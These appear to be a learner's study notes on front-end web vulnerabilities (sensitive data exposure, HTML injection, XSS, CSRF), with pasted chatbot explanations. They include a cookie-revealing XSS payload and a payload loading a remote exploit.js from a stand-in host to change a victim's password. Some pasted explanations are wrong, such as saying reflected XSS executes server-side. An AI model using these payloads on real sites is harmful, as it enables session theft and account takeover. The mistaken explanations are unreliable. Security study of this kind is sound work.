  

  

  

![[Screenshot_from_2023-09-05_06-02-39.png]]

  

![[Screenshot_from_2023-09-05_06-03-59.png]]

  

  

  

  

  

![[Screenshot_from_2023-09-05_06-06-04.png]]

  

  

  

  

  

  

  

# 1. Sensitive Data Exposures :

---

- All the front end components are interacting at the Client-Side.
- this means that they are interacting with the browser only.
- so, and as they are not interacitng with the host-server this means they dont relate to the main host-server and they cannot cause any permenant damage to the website as what i do with the inspect and manipulating the html code this leads to only change for me not the main website.
- However, as these components are executed on the `client-side`, they put the end-user in danger of being attacked and exploited if they do have any vulnerabilities.
- if the front end vulnerablility is used to attack admin users then we will have there admin access and we call that unauthorized access .
- **[Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)** refers to the availability of sensitive data but the problem it is in `clear-Text` to the end user.
- we can find the **==cleartext==** sensitive data of the end user in the source code of the webpage and this is called **==_sensitivity data exposure_==****_._**
- the clear txt will be found in the pagesource = source code of the webpage.
- Sometimes a developer may disable right-clicking on a web application,  
    but this does not prevent us from viewing the page source as we can  
    merely type `ctrl + u` or view the page source through a web proxy such as `Burp Suite`.
- Sometimes we may find login `credentials`, `hashes`, or other ==sensitive data== hidden in the
    - **==comments==** of a web page's source code
    - or ==**within external**== ==**`JavaScript`**== ==**code**== being imported.
- Other sensitive information may include exposed links or directories or even exposed user information
- For this reason, one of the first things we should do when assessing a web application is to review its page source code to see if we can identify any 'low-hanging fruit', such as exposed credentials or hidden links.

💡

first things we should do when assessing a web application is to ==**review its page source**== code to see if we can identify any '==low-hanging frui==t', such as **==exposed credentials==** or ==**hidden links**==.

# 2. HTML Injection :

---

- [HTML injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection) occurs when **==unfiltered user inpu==**t is displayed on the page
- This can either be through retrieving previously submitted code, like  
    retrieving a user comment from the back end database, or by directly  
    displaying unfiltered user input through `JavaScript` on the front end.
- When a user has complete control of how their input will be displayed, they can submit `HTML` code, and the browser may display it as part of the page. This may include a malicious `HTML`  
    code, like an external login form, which can be used to trick users  
    into logging in while actually sending their login credentials to a  
    malicious server to be collected for other attacks.

# 3. Cross-Site Scripting (XSS) :

---

- it is also a vulnerability that depends on :

  

- the developer didnot limit the type of data that the user can input so the user can input any type or kind of data.
- so in the HTML inJEction we enetered html code .
- but in teh cross site scripting we will enter JavaScript ode .

`XSS` involves the injection of `JavaScript` code to perform more advanced attacks on the client-side, instead of merely injecting HTML code. There are three main types of `XSS`:

|   |   |
|---|---|
|Type|Description|
|`Reflected XSS`|Occurs when user input is displayed on the page after processing (e.g., search result or error message).|
|`Stored XSS`|Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).|
|`DOM XSS`|Occurs when user input is directly shown in the browser and is written to an `HTML` DOM object (e.g., vulnerable username or page title).|

In the example we saw for `HTML Injection`, there was no input sanitization whatsoever. Therefore, it may be possible for the same page to be vulnerable to `XSS` attacks. We can try to inject the following `DOM XSS` `JavaScript` code as a payload, which should show us the cookie value for the current user:

Code: javascript

  

```
#"><img src=/ onerror=alert(document.cookie)>
```

Once we input our payload and hit `ok`, we see that an alert window pops up with the cookie value in it:

[![](https://academy.hackthebox.com/storage/modules/75/web_apps_xss_2.jpg)](https://academy.hackthebox.com/storage/modules/75/web_apps_xss_2.jpg)

  

**==Reflected XSS==** and ==**DOM XSS**== are two types of **==cross-site scripting (XSS) attacks==**. XSS attacks occur when an attacker injects malicious code into a web page, which is then executed **==by the victim's browser==**.

The main difference between ==reflected XSS== and ==DOM XSS== is **==where the malicious code is executed==**. In reflected XSS, the malicious code is executed on the server-side, when the victim's browser requests the web page. In DOM XSS, the malicious code is executed on the client-side, in the victim's browser.

Here is a table summarizing the key differences between reflected XSS and DOM XSS:

|   |   |   |
|---|---|---|
|Characteristic|Reflected XSS|DOM XSS|
|Where is the malicious code executed?|Server-side|Client-side|
|How is the malicious code injected?|In the HTTP request|In the DOM|
|How is the attack triggered?|By the victim clicking on a malicious link or submitting a form|By the victim interacting with the web page in a certain way|
|How can it be prevented?|By encoding all user input before it is sent to the server|By escaping all user input before it is used to create the DOM|

Reflected XSS is the most common type of XSS attack. It is often used to steal cookies or session tokens, which can then be used to impersonate the victim. DOM XSS is less common, but it can be more dangerous. This is because the malicious code is executed on the victim's browser, which gives the attacker more control over the victim's session.

Here are some examples of reflected XSS and DOM XSS attacks:

- A malicious link that contains a JavaScript code snippet that steals the victim's cookies.
- A form that submits the victim's input to a server-side script that does not properly sanitize the input.
- A web page that uses a JavaScript library that is vulnerable to DOM XSS.

To prevent XSS attacks, developers should encode all user input before it is sent to the server. They should also escape all user input before it is used to create the DOM. Additionally, they should use a web application firewall (WAF) to block known XSS attacks.

I hope this helps!

  

Yes, you are right. Every HTML code is an object in the DOM. The DOM is a programming interface that allows JavaScript to interact with HTML documents. It represents the document as a tree of objects, with each object representing an HTML element, text node, or attribute.

For example, the following HTML code:

HTML

```
<h1>This is a heading</h1>
```

Use code with caution. [Learn more](https://bard.google.com/faq#coding)

would be represented in the DOM as the following object tree:

`document |- h1 |- text node: "This is a heading"`

The `document` object is the root of the DOM tree. It represents the entire HTML document. The `h1` object is a child of the `document` object. It represents the `<h1>` element in the HTML code. The `text node` object is a child of the `h1` object. It represents the text content of the `<h1>` element.

The DOM is a powerful tool that allows JavaScript to manipulate HTML documents. It can be used to change the structure of the document, add or remove elements, and change the content of elements.

That's correct. The DOM is not specific to HTML. It can be used to represent any kind of document, including XML, SVG, and JSON. In fact, the DOM is a standard interface, so it can be used with any programming language that supports it.

Here are some of the programming languages that support the DOM:

- JavaScript
- Python
- Java
- C++
- PHP
- Ruby
- Swift
- Kotlin
- TypeScript

The DOM is a powerful tool that can be used to manipulate documents in a variety of ways. It is a fundamental part of web development, and it is also used in other areas of software development, such as document processing and data visualization.

  

types of corss-site-scripting xss

- reflected xss: occurs when user inputs are displayed on the page .
- stored xss : occures when user inputs are
- dom xss

  

![[Screenshot_from_2023-09-05_02-32-13.png]]

  

  

- the injection is called a payload .

  

# 4. Cross-Site Request Forgery (CSRF) :

---

- similar in name to the xss cross stite scripting

  

![[Screenshot_from_2023-09-05_02-43-50.png]]

- utilize `XSS` vulnerabilities to perform certain queries, and `API` calls on a web application that the victim is currently authenticated to.
    
    ![[Screenshot_from_2023-09-05_02-50-14.png]]
    

  

  

![[Screenshot_from_2023-09-05_02-58-01.png]]

  

`CSRF` can also be leveraged to attack admins and gain  
access to their accounts. Admins usually have access to sensitive  
functions, which can sometimes be used to attack and gain control over  
the back-end server (depending on the functionality provided to admins  
within a given web application). Following this example, instead of  
using `JavaScript` code that would return the session cookie, we would load a remote `.js` (`JavaScript`) file, as follows:

Code: html

```
"><script src=//www.example.com/exploit.js></script>
```

The `exploit.js` file would contain the malicious `JavaScript` code that changes the user's password. Developing the `exploit.js` in this case requires knowledge of this web application's password changing procedure and `APIs`. The attacker would need to create `JavaScript` code that would replicate the desired functionality and automatically carry it out (i.e., `JavaScript` code that changes our password for this specific web application).